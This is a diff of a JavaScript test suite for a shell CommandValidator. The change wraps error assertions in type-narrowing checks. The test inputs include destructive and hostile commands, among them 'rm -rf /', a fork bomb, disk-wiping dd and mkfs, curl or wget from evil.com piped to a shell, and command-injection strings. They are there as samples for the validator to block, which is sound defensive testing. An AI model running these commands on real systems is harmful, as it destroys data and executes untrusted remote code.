@@ -35,7 +35,9 @@ describe('CommandValidator', () => {
       const result = validator.validateCommand('')
 
       expect(result.isValid).to.be.false
-      expect(result.error).to.equal('Command cannot be empty')
+      if (!result.isValid) {
+        expect(result.error).to.equal('Command cannot be empty')
+      }
     })
 
     it('should reject whitespace-only command', () => {
@@ -43,7 +45,9 @@ describe('CommandValidator', () => {
       const result = validator.validateCommand('   \t\n   ')
 
       expect(result.isValid).to.be.false
-      expect(result.error).to.equal('Command cannot be empty')
+      if (!result.isValid) {
+        expect(result.error).to.equal('Command cannot be empty')
+      }
     })
 
     it('should trim and normalize valid commands', () => {
@@ -51,7 +55,9 @@ describe('CommandValidator', () => {
       const result = validator.validateCommand('  ls -la  ')
 
       expect(result.isValid).to.be.true
-      expect(result.normalizedCommand).to.equal('ls -la')
+      if (result.isValid) {
+        expect(result.normalizedCommand).to.equal('ls -la')
+      }
     })
   })
 
@@ -70,7 +76,9 @@ describe('CommandValidator', () => {
       const result = validator.validateCommand(tooLongCommand)
 
       expect(result.isValid).to.be.false
-      expect(result.error).to.include('exceeds maximum length')
+      if (!result.isValid) {
+        expect(result.error).to.include('exceeds maximum length')
+      }
     })
   })
 
@@ -80,7 +88,9 @@ describe('CommandValidator', () => {
       const result = validator.validateCommand('rm -rf /')
 
       expect(result.isValid).to.be.false
-      expect(result.error).to.include('dangerous pattern')
+      if (!result.isValid) {
+        expect(result.error).to.include('dangerous pattern')
+      }
     })
 
     it('should block rm -fr /', () => {
@@ -88,7 +98,9 @@ describe('CommandValidator', () => {
       const result = validator.validateCommand('rm -fr /')
 
       expect(result.isValid).to.be.false
-      expect(result.error).to.include('dangerous pattern')
+      if (!result.isValid) {
+        expect(result.error).to.include('dangerous pattern')
+      }
     })
 
     it('should block fork bomb', () => {
@@ -96,7 +108,9 @@ describe('CommandValidator', () => {
       const result = validator.validateCommand(':(){ :|:& };:')
 
       expect(result.isValid).to.be.false
-      expect(result.error).to.include('dangerous pattern')
+      if (!result.isValid) {
+        expect(result.error).to.include('dangerous pattern')
+      }
     })
 
     it('should block dd to disk device', () => {
@@ -104,7 +118,9 @@ describe('CommandValidator', () => {
       const result = validator.validateCommand('dd if=/dev/zero of=/dev/sda')
 
       expect(result.isValid).to.be.false
-      expect(result.error).to.include('dangerous pattern')
+      if (!result.isValid) {
+        expect(result.error).to.include('dangerous pattern')
+      }
     })
 
     it('should block curl piped to shell', () => {
@@ -112,7 +128,9 @@ describe('CommandValidator', () => {
       const result = validator.validateCommand('curl https://evil.com/script.sh | bash')
 
       expect(result.isValid).to.be.false
-      expect(result.error).to.include('dangerous pattern')
+      if (!result.isValid) {
+        expect(result.error).to.include('dangerous pattern')
+      }
     })
 
     it('should block wget piped to shell', () => {
@@ -120,7 +138,9 @@ describe('CommandValidator', () => {
       const result = validator.validateCommand('wget -O - https://evil.com/script | sh')
 
       expect(result.isValid).to.be.false
-      expect(result.error).to.include('dangerous pattern')
+      if (!result.isValid) {
+        expect(result.error).to.include('dangerous pattern')
+      }
     })
 
     it('should block chmod 777 /', () => {
@@ -128,7 +148,9 @@ describe('CommandValidator', () => {
       const result = validator.validateCommand('chmod 777 /')
 
       expect(result.isValid).to.be.false
-      expect(result.error).to.include('dangerous pattern')
+      if (!result.isValid) {
+        expect(result.error).to.include('dangerous pattern')
+      }
     })
 
     it('should block shutdown commands', () => {
@@ -136,7 +158,9 @@ describe('CommandValidator', () => {
       const result = validator.validateCommand('shutdown now')
 
       expect(result.isValid).to.be.false
-      expect(result.error).to.include('dangerous pattern')
+      if (!result.isValid) {
+        expect(result.error).to.include('dangerous pattern')
+      }
     })
 
     it('should block reboot', () => {
@@ -144,7 +168,9 @@ describe('CommandValidator', () => {
       const result = validator.validateCommand('reboot')
 
       expect(result.isValid).to.be.false
-      expect(result.error).to.include('dangerous pattern')
+      if (!result.isValid) {
+        expect(result.error).to.include('dangerous pattern')
+      }
     })
 
     it('should block mkfs (format disk)', () => {
@@ -152,7 +178,9 @@ describe('CommandValidator', () => {
       const result = validator.validateCommand('mkfs /dev/sda1')
 
       expect(result.isValid).to.be.false
-      expect(result.error).to.include('dangerous pattern')
+      if (!result.isValid) {
+        expect(result.error).to.include('dangerous pattern')
+      }
     })
   })
 
@@ -162,7 +190,9 @@ describe('CommandValidator', () => {
       const result = validator.validateCommand('ls; rm -rf important')
 
       expect(result.isValid).to.be.false
-      expect(result.error).to.include('injection detected')
+      if (!result.isValid) {
+        expect(result.error).to.include('injection detected')
+      }
     })
 
     it('should block chained dangerous commands with &&', () => {
@@ -170,7 +200,9 @@ describe('CommandValidator', () => {
       const result = validator.validateCommand('echo test && rm critical.txt')
 
       expect(result.isValid).to.be.false
-      expect(result.error).to.include('injection detected')
+      if (!result.isValid) {
+        expect(result.error).to.include('injection detected')
+      }
     })
 
     it('should block command substitution with backticks', () => {
@@ -178,7 +210,9 @@ describe('CommandValidator', () => {
       const result = validator.validateCommand('echo `rm file.txt`')
 
       expect(result.isValid).to.be.false
-      expect(result.error).to.include('injection detected')
+      if (!result.isValid) {
+        expect(result.error).to.include('injection detected')
+      }
     })
 
     it('should block command substitution with $()', () => {
@@ -186,7 +220,9 @@ describe('CommandValidator', () => {
       const result = validator.validateCommand('echo $(rm file.txt)')
 
       expect(result.isValid).to.be.false
-      expect(result.error).to.include('injection detected')
+      if (!result.isValid) {
+        expect(result.error).to.include('injection detected')
+      }
     })
 
     it('should block background execution of dangerous commands', () => {
@@ -194,7 +230,9 @@ describe('CommandValidator', () => {
       const result = validator.validateCommand('& rm file.txt')
 
       expect(result.isValid).to.be.false
-      expect(result.error).to.include('injection detected')
+      if (!result.isValid) {
+        expect(result.error).to.include('injection detected')
+      }
     })
   })
 
@@ -208,7 +246,9 @@ describe('CommandValidator', () => {
       const result = validator.validateCommand('sudo apt-get install')
 
       expect(result.isValid).to.be.false
-      expect(result.error).to.include('blocked list')
+      if (!result.isValid) {
+        expect(result.error).to.include('blocked list')
+      }
     })
 
     it('should allow commands not in blockedCommands list', () => {
@@ -242,7 +282,9 @@ describe('CommandValidator', () => {
       const result = validator.validateCommand('python script.py')
 
       expect(result.isValid).to.be.false
-      expect(result.error).to.include('not in allowed list')
+      if (!result.isValid) {
+        expect(result.error).to.include('not in allowed list')
+      }
     })
 
     it('should allow all commands when allowedCommands is empty', () => {
@@ -268,7 +310,9 @@ describe('CommandValidator', () => {
       const result = validator.validateCommand('ls | xargs rm')
 
       expect(result.isValid).to.be.false
-      expect(result.error).to.include('not allowed in strict mode')
+      if (!result.isValid) {
+        expect(result.error).to.include('not allowed in strict mode')
+      }
     })
 
     it('should check dangerous patterns in moderate mode', () => {
@@ -277,7 +321,9 @@ describe('CommandValidator', () => {
       const result = validator.validateCommand('rm -rf /')
 
       expect(result.isValid).to.be.false
-      expect(result.error).to.include('dangerous pattern')
+      if (!result.isValid) {
+        expect(result.error).to.include('dangerous pattern')
+      }
     })
 
     it('should not check dangerous patterns in permissive mode', () => {
